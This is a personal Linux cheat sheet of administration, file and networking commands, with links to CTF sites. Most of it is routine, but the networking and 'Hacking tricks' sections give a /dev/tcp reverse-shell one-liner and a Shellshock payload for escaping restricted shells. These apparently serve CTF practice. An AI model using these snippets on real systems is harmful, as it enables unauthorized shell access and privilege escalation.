# Linux cheat sheet 
A quick reference for less commonly used commands and tricks.

## Useful One-Liners

    * Checking md5 sums: 
    For macos:
        `curl -s https://site.com/md5sumfile.md5 && md5 -q /path/to/object`
    For Linux:
        `echo "$(curl -s https://amazon-ecs-cli.s3.amazonaws.com/ecs-cli-linux-amd64-latest.md5) /usr/local/bin/ecs-cli" | md5sum -c -`

## File Management
**`xxd`**
    Create hex dumps

**`strings`**
    Good for getting readable text out of dumps

**`uniq`**
    Isolate unique lines in file

**`diff`**
    Examine file differences. vimdiff better for extensive edits

**`patch`**
    Apply changes to files

**`mkfifo`**
    first in first out pipe. 

## Administration
**`adduser`, `addgroup`**
    Prefer this over useradd/groupadd

**`groups`**
    What groups does the user belong to

**`usermod`**
    To add a user to groups:
        `usermod -aG [groups to add] [user]

**`id`**
    If you need queries beyond `groups`

**`dpkg`**
    For deb files. `-r` to remove things

## Networking
**`nmap`**
    Port scanning. 

**`nc` or nmap's `ncat`**
    Swiss army knife for network testing.

**`telnet`**
    Deprecated, but useful for port testing

**`openssl`**
    Openssl utility: key management, cert generation, etc.

**`/dev/tcp`**
    Can redirect things through network connections with `/dev/tcp/"ip"/"port"`. Not
    a real file, but more of a bash construct. Useful injection command. Has udp variant too. 
    ex. `bash -c "id &> /dev/tcp/127.0.0.1/80"`

**`exec "file-descriptor"<>"file"`**
    Can be used to create a read-write file for network communication in lieu netcat.
    Ex. `exec 134<>/dev/tcp/127.0.0.1/30002; bash <&134 >&134 2>&1 &` will open up
    an interactive shell. Just have a listener on port 30002 of the 127.0.0.1 machine

## Programming
**`ldconfig`**
    Can see installed libs, etc. `-p` to print

**`ldd`**
    Useful to find what a program is linked against.

**`checkinstall`**
    For removing packages built from source with no uninstall hook

## Hacking tricks

**shellshock**
    `ssh user@host '() { :;}; echo BAD CODE'` allows an authorized user with an authorized key
    to execute restricted commands. Good for restriced shell escalating.

## Sites

https://overthewire.org
https://www.scip.ch/en/?labs.20181206
https://hackthebox.eu
https://root-me.org
https://lolbas-project.github.io/#
https://gtfobins.github.io/#+shell
